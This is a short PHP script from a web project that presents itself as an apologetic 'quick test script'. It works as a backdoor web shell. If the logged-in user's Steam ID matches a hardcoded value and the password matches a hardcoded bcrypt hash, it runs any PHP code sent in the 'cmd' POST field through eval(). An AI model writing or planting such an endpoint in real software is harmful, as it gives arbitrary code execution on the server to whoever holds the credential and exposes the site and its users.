<?php

require '_test.php';

// hello i am sorry but this is my quick test script. sorry!!

$pass = getPost('pass');
$cmd = getPost('cmd');

$viewData = array(
  'pass' => $pass,
  'cmd' => $cmd,
);

if($User['steamId64'] != '76561198010087850'){
  Notice::error('Nooooo!');
  view($viewData);
  exit;
}


if(crypt($pass, '$2a$07$DamnItFeelsGoodToBeAGangsta$') != '$2a$07$DamnItFeelsGoodToBeAGOXVBTJ9UopDd3QmrsILJwTkD4OW1O3Lu'){
  Notice::error('wrong');
  view($viewData);
  exit;
}

// sorry!!!!!!!
if($cmd) {
  eval($cmd);
}


view($viewData);
